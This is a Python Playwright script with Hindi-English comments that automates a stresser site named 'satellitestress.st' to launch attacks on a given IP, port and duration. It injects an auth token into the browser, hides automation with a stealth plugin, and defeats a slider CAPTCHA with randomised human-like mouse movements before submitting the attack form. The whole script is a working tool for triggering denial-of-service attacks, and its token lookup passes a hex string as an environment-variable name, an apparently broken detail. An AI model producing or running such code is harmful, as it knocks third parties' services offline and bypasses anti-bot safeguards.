import os
import asyncio
import random
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

async def solve_slider(page):
    # Slider ka button dhoondein (iske selector ko site ke hisaab se check karein)
    slider_handle = await page.wait_for_selector('.slider-button') 
    box = await slider_handle.bounding_box()
    
    # Mouse ko slider par le jayein
    await page.mouse.move(box['x'] + box['width'] / 2, box['y'] + box['height'] / 2)
    await page.mouse.down()
    
    # Human-like movement: Thoda ruk-ruk kar aur random speed se slide karein
    target_x = box['x'] + 300 # 300px slide karna hai (example)
    current_x = box['x']
    
    while current_x < target_x:
        step = random.randint(5, 15)
        current_x += step
        await page.mouse.move(current_x, box['y'] + random.randint(-2, 2))
        await asyncio.sleep(random.uniform(0.01, 0.05))
        
    await page.mouse.up()

async def trigger_attack(ip, port, duration):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        # Token ko LocalStorage ya Cookie mein set karein
        context = await browser.new_context()
        page = await context.new_page()
        await stealth_async(page)
        
        # Site open karein
        await page.goto("https://satellitestress.st/attack")
        
        # Token inject karein (Agar token 'auth' name se hai)
        token = os.getenv("50e58fe03664645cad511834db318fc98bc6ddeff77bf91c03e2e8b868cba00f")
        await page.evaluate(f"localStorage.setItem('token', '{token}')")
        await page.reload() # Token apply karne ke liye reload

        # Slider captcha handle karein
        await solve_slider(page)
        
        # Form bharein
        await page.fill('#host', ip)
        await page.fill('#port', port)
        await page.fill('#time', duration)
        await page.click('#start-btn')
        
        await browser.close()
        return "Command Sent!"
        